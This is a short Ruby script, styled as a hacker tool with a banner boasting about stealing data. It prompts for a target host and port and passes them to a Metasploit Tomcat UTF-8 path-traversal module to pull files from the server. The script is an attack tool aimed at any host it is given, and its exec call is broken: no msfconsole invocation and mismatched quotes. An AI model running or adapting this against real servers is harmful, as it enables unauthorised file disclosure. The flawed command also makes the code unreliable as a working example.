puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...
  
  File Disclosure Scanner
"""

puts " [?] What is the target? "
print "[!] --->"

target = gets.chomp

puts " [?] What is the port? "
print " [!] ---> "

port = gets.chomp

exec("use admin/http/tomcat_utf8_traversal' -x 'setg RHOSTS #{target}'  -x 'setg RPORT #{port}' -x 'run'")

